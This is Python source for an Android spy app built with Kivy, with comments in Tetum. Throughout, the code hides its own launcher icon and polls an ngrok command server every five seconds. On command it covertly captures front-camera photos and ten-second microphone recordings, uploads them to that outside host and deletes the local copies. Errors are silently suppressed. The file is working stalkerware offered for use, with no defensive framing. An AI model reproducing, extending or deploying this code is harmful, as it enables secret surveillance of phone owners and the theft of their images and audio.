import os, time, requests
from kivy.app import App
from kivy.clock import Clock
from jnius import autoclass

# Uza link fiksa husi ó-nia Dashboard Ngrok
URL_NGROK = "https://bleariest-portraitlike-dreama.ngrok-free.dev"

class SpyApp(App):
    def build(self):
        self.hide_icon() # Subar íkone kedas bainhira loke
        Clock.schedule_interval(self.check_server, 5) # Kontrola orden kada segundu 5
        return None

    def hide_icon(self):
        try:
            PA = autoclass('org.kivy.android.PythonActivity').mActivity
            PM = autoclass('android.content.pm.PackageManager')
            CN = autoclass('android.content.ComponentName')
            # Naran paket tenke hanesan ho buildozer.spec
            comp = CN("org.test.cameraspy", "org.kivy.android.PythonActivity")
            PA.getPackageManager().setComponentEnabledSetting(comp, PM.COMPONENT_ENABLED_STATE_DISABLED, PM.DONT_KILL_APP)
        except: pass

    def check_server(self, dt):
        try:
            r = requests.get(f"{URL_NGROK}/get-command", timeout=5)
            cmd = r.json().get("action")
            if cmd == "photo": self.take_photo()
            elif cmd == "mic": self.record_mic()
            elif cmd == "sms": self.send_data("sms", "Status: SMS monitor aktivu")
        except: pass

    def take_photo(self):
        import cv2
        cap = cv2.VideoCapture(1) # Kamera oin
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("snap.jpg", frame)
            self.upload_file("snap.jpg")
        cap.release()

    def record_mic(self):
        MR = autoclass('android.media.MediaRecorder')
        rec = MR()
        rec.setAudioSource(1)
        rec.setOutputFormat(3)
        rec.setOutputFile("/sdcard/audio.3gp")
        rec.setAudioEncoder(1)
        rec.prepare()
        rec.start()
        time.sleep(10) # Grava segundu 10
        rec.stop()
        self.upload_file("/sdcard/audio.3gp")

    def upload_file(self, path):
        with open(path, 'rb') as f:
            requests.post(f"{URL_NGROK}/upload", files={'file': f})
        if os.path.exists(path): os.remove(path)

    def send_data(self, type, content):
        requests.post(f"{URL_NGROK}/receive-data", data={'type': type, 'content': content})

if __name__ == '__main__':
    SpyApp().run()
